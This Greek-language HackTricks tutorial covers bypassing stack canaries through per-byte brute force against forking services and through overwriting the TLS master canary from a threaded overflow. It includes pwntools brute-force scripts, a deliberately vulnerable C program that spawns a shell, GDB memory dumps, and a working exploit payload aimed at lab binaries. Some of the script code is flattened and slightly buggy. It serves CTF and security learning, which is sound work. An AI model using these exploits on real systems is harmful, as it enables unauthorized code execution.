# BF Forked & Threaded Stack Canaries

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου AWS του HackTricks)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

**Αν αντιμετωπίζετε ένα δυαδικό που προστατεύεται από ένα canary και το PIE (Position Independent Executable) πιθανότατα χρειάζεστε έναν τρόπο να τα παρακάμψετε.**

![](<../../../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
Σημειώστε ότι το **`checksec`** ενδέχεται να μην εντοπίσει ότι ένα δυαδικό προστατεύεται από ένα canary εάν αυτό ήταν στατικά μεταγλωττισμένο και δεν είναι ικανό να αναγνωρίσει τη λειτουργία.\
Ωστόσο, μπορείτε να παρατηρήσετε χειροκίνητα αυτό εάν διαπιστώσετε ότι μια τιμή αποθηκεύεται στη στοίβα στην αρχή μιας κλήσης συνάρτησης και αυτή η τιμή ελέγχεται πριν την έξοδο.
{% endhint %}

## Βίαιη δύναμη Canary

Ο καλύτερος τρόπος να παρακάμψετε ένα απλό canary είναι εάν το δυαδικό είναι ένα πρόγραμμα **που δημιουργεί παιδικές διεργασίες κάθε φορά που καθιερώνετε μια νέα σύνδεση** μαζί του (υπηρεσία δικτύου), επειδή κάθε φορά που συνδέεστε σε αυτό **θα χρησιμοποιηθεί το ίδιο canary**.

Στη συνέχεια, ο καλύτερος τρόπος να παρακάμψετε το canary είναι απλώς να το **επιτεθείτε βίαια χαρακτήρα προς χαρακτήρα**, και μπορείτε να καταλάβετε εάν το μάντεψε canary byte ήταν σωστό ελέγχοντας εάν το πρόγραμμα έχει καταρρεύσει ή συνεχίζει την κανονική του ροή. Σε αυτό το παράδειγμα η συνάρτηση **επιτίθεται βίαια σε ένα canary 8 Bytes (x64)** και διακρίνει μεταξύ ενός σωστού μαντεμένου byte και ενός κακού byte απλώς **ελέγχοντας** εάν ένας **αποκρίνεται** επιστρέφεται από τον εξυπηρετητή (μια άλλη λύση σε **άλλη κατάσταση** θα μπορούσε να είναι η χρήση ενός **try/except**):

### Παράδειγμα 1

Αυτό το παράδειγμα εφαρμόζεται για 64bit αλλά θα μπορούσε εύκολα να εφαρμοστεί και για 32 bit.
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
### Παράδειγμα 2

Αυτό υλοποιείται για 32 bits, αλλά μπορεί εύκολα να αλλάξει σε 64 bits.\
Επίσης, σημειώστε ότι για αυτό το παράδειγμα το πρόγραμμα περιμένει πρώτα ένα byte για να υποδείξει το μέγεθος της εισόδου και του payload.
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
## Νήματα

Τα νήματα της ίδιας διεργασίας θα **μοιραστούν το ίδιο διακριτικό canary**, επομένως θα είναι δυνατό να **δοκιμάσουμε βίαια** ένα canary αν το δυαδικό αρχείο δημιουργεί ένα νέο νήμα κάθε φορά που συμβαίνει μια επίθεση.&#x20;

Ένας υπερχείλισης buffer σε μια συνάρτηση με νήμα που προστατεύεται με canary μπορεί να χρησιμοποιηθεί για να τροποποιήσει τον κύριο canary της διεργασίας. Ως αποτέλεσμα, η αντιμετώπιση είναι άχρηστη επειδή ο έλεγχος χρησιμοποιείται με δύο canaries που είναι ίδιοι (αν και τροποποιημένοι).

### Παράδειγμα

Το παρακάτω πρόγραμμα είναι ευάλωτο σε Buffer Overflow, αλλά έχει μεταγλωττιστεί με canary:
```c
#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

// gcc thread_canary.c -no-pie -l pthread -o thread_canary

void win() {
execve("/bin/sh", NULL, NULL);
}

void* vuln() {
char data[0x20];
gets(data);
}

int main() {
pthread_t thread;

pthread_create(&thread, NULL, vuln, NULL);
pthread_join(thread, NULL);

return 0;
}
```
Σημειώστε ότι το `vuln` καλείται μέσα σε ένα νήμα. Στο GDB μπορούμε να εξετάσουμε το `vuln`, συγκεκριμένα, στο σημείο όπου το πρόγραμμα καλεί το `gets` για να διαβάσει δεδομένα εισόδου:
```bash
gef> break gets
Breakpoint 1 at 0x4010a0
gef> run
...
gef> x/10gx $rdi
0x7ffff7d7ee20: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee30: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee40: 0x0000000000000000      0x493fdc653a156800
0x7ffff7d7ee50: 0x0000000000000000      0x00007ffff7e17ac3
0x7ffff7d7ee60: 0x0000000000000000      0x00007ffff7d7f640
```
Το παραπάνω αντιπροσωπεύει τη διεύθυνση του `data`, όπου το πρόγραμμα θα γράψει την είσοδο του χρήστη. Το stack canary βρίσκεται στη διεύθυνση `0x7ffff7d7ee48` (`0x493fdc653a156800`), και η διεύθυνση επιστροφής βρίσκεται στη διεύθυνση `0x7ffff7d7ee50` (`0x00007ffff7e17ac3`):
```bash
gef> telescope $rdi 8 -n
0x7ffff7d7ee20|+0x0000|+000: 0x0000000000000000  <-  $rdi
0x7ffff7d7ee28|+0x0008|+001: 0x0000000000000000
0x7ffff7d7ee30|+0x0010|+002: 0x0000000000000000
0x7ffff7d7ee38|+0x0018|+003: 0x0000000000000000
0x7ffff7d7ee40|+0x0020|+004: 0x0000000000000000
0x7ffff7d7ee48|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7ee50|+0x0030|+006: 0x0000000000000000  <-  $rbp
0x7ffff7d7ee58|+0x0038|+007: 0x00007ffff7e17ac3 <start_thread+0x2f3>  ->  0xe8ff31fffffe6fe9  <-  retaddr[2]
```
Παρατηρήστε ότι οι διευθύνσεις του stack δεν ανήκουν στο πραγματικό stack:
```bash
gef> vmmap stack
[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x00007ffff7580000 0x00007ffff7d83000 0x0000000000803000 0x0000000000000000 rw- <tls-th1><stack-th2>  <-  $rbx, $rsp, $rbp, $rsi, $rdi, $r12
0x00007ffffffde000 0x00007ffffffff000 0x0000000000021000 0x0000000000000000 rw- [stack]  <-  $r9, $r15
```
Το stack του thread τοποθετείται πάνω από το Thread Local Storage (TLS), όπου αποθηκεύεται το master canary:
```bash
gef> tls
$tls = 0x7ffff7d7f640
...
---------------------------------------------------------------------------- TLS ----------------------------------------------------------------------------
0x7ffff7d7f640|+0x0000|+000: 0x00007ffff7d7f640  ->  [loop detected]  <-  $rbx, $r12
0x7ffff7d7f648|+0x0008|+001: 0x00000000004052b0  ->  0x0000000000000001
0x7ffff7d7f650|+0x0010|+002: 0x00007ffff7d7f640  ->  [loop detected]
0x7ffff7d7f658|+0x0018|+003: 0x0000000000000001
0x7ffff7d7f660|+0x0020|+004: 0x0000000000000000
0x7ffff7d7f668|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7f670|+0x0030|+006: 0xb79b79966e9916c4  <-  PTR_MANGLE cookie
0x7ffff7d7f678|+0x0038|+007: 0x0000000000000000
...
```
{% hint style="info" %}
Κάποιες από τις παραπάνω λειτουργίες του GDB ορίζονται σε μια επέκταση που ονομάζεται [bata24/gef](https://github.com/bata24/gef), η οποία έχει περισσότερες λειτουργίες από το συνηθισμένο [hugsy/gef](https://github.com/hugsy/gef).
{% endhint %}

Ως αποτέλεσμα, ένα μεγάλο Buffer Overflow μπορεί να επιτρέψει την τροποποίηση τόσο του stack canary όσο και του master canary στο TLS. Αυτή είναι η μετατόπιση:
```bash
gef> p/x 0x7ffff7d7f668 - $rdi
$1 = 0x848
```
Αυτό είναι ένα σύντομο exploit για να καλέσετε την `win`:
```python
from pwn import *

context.binary = 'thread_canary'

payload  = b'A' * 0x28                    # buffer overflow offset
payload += b'BBBBBBBB'                    # overwritting stack canary
payload += b'A' * 8                       # saved $rbp
payload += p64(context.binary.sym.win)    # return address
payload += b'A' * (0x848 - len(payload))  # padding
payload += b'BBBBBBBB'                    # overwritting master canary

io = context.binary.process()
io.sendline(payload)
io.interactive()
```
## Άλλα παραδείγματα & αναφορές

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html)
* 64 bits, χωρίς PIE, nx, BF canary, εγγραφή σε κάποια μνήμη ενός ROP για να καλέσει το `execve` και να μεταβεί εκεί.
* [http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads](http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads)
* 64 bits, χωρίς PIE, nx, τροποποίηση του thread και του master canary.
